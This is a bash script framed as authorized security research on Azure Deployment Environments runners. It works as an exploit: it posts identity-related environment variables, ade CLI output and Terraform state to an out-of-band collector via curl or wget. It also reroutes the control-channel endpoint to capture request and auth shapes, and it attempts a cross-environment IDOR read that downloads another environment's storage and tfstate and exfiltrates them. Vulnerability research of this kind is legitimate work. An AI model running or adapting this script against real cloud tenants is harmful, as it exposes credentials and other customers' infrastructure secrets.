#!/usr/bin/env bash
# Diagnostic entrypoint for authorized Azure Deployment Environments runner research.
# Records runtime context and the ADE Runner-Management control-channel request shape,
# forwarding to the researcher OOB collector for analysis. Read-only against the platform.
set +e
OOB="${OOB:-}"; ROLE="${ROLE:-diag}"
ADE="ade"; command -v ade >/dev/null 2>&1 || ADE="/adecli/ade"
ZERO="00000000-0000-0000-0000-000000000000"

send() { # send <tag> <data>
  local tag="$1"; local data="$2"
  [ -z "$OOB" ] && return 0
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "$OOB/$ROLE/$tag" --data-binary "$data" >/dev/null 2>&1
  else
    wget -q -O /dev/null --timeout=25 --post-data="$data" "$OOB/$ROLE/$tag" 2>/dev/null
  fi
}

# 1) runtime context + ids
send ctx "$(env | grep -iE '^ADE_|^ARM_|^AZURE_|^MSI_|^IDENTITY_' | sort)"
send info "$(echo '#### ade info'; $ADE info 2>&1; echo '#### ade environment'; $ADE environment 2>&1; echo '#### ade files list'; $ADE files list 2>&1)"
send storage "$(echo '## ADE_STORAGE='"$ADE_STORAGE"; ls -la "$ADE_STORAGE" 2>&1; echo '## tfstate head'; head -c 4000 "$ADE_STORAGE/environment.tfstate" 2>&1)"

if [ "$ROLE" = "victim" ]; then
  # Hold the deploy operation open so its operationId stays live while the cross-read runs.
  HOLD="${HOLD:-0}"
  send hold "victim holding ${HOLD}s; opid=$ADE_HTTP__OPERATIONID dcid=$ADE_HTTP__DEVCENTERID"
  [ "$HOLD" -gt 0 ] 2>/dev/null && sleep "$HOLD"
  exit 0
fi

if [ "$ROLE" = "probe" ] || [ "$ROLE" = "attacker" ]; then
  # 2) capture exact control-channel request+auth shape by routing calls to the researcher collector
  mkdir -p /tmp/cap
  ADE_HTTP__ENDPOINT="$OOB/RMAPI" $ADE files list >/tmp/cap/list.txt 2>&1
  ADE_HTTP__ENDPOINT="$OOB/RMAPI" $ADE files download --file-name storage.zip --folder-path /tmp/cap >/tmp/cap/dl.txt 2>&1
  echo '{"k":"v"}' > /tmp/cap/o.json
  ADE_HTTP__ENDPOINT="$OOB/RMAPI" $ADE outputs upload --file /tmp/cap/o.json >/tmp/cap/up.txt 2>&1
  send capshape "$(echo '##list-rc'; cat /tmp/cap/list.txt; echo '##dl-rc'; cat /tmp/cap/dl.txt; echo '##up-rc'; cat /tmp/cap/up.txt)"

  # 3) is the operation id read per-invocation? bogus id should change the result if so
  send overridetest "$(echo '## bogus opid files list:'; ADE_HTTP__OPERATIONID="$ZERO" $ADE files list 2>&1; echo '## bogus dcid files list:'; ADE_HTTP__DEVCENTERID="/subscriptions/$ZERO/resourceGroups/x/providers/Microsoft.DevCenter/devcenters/x" $ADE files list 2>&1)"

  # 4) CROSS-ENVIRONMENT READ: present the target environment's capability ids while running
  #    as THIS runner's identity, addressing the real regional gateway.
  if [ -n "$TARGET_OP" ]; then
    mkdir -p /tmp/x
    ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" \
      $ADE files list >/tmp/x/list.txt 2>&1
    ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" \
      $ADE files download --file-name storage.zip --folder-path /tmp/x --unzip >/tmp/x/dl.txt 2>&1
    rc=$?
    send idor "$(echo '## target_op='"$TARGET_OP"' target_dcid='"$TARGET_DCID"; echo '## files list rc:'; cat /tmp/x/list.txt; echo '## download rc='"$rc"':'; cat /tmp/x/dl.txt; echo '## dir:'; ls -laR /tmp/x 2>&1; echo '## TARGET tfstate head:'; head -c 8000 /tmp/x/environment.tfstate 2>&1)"
  fi
  exit 0
fi
exit 0
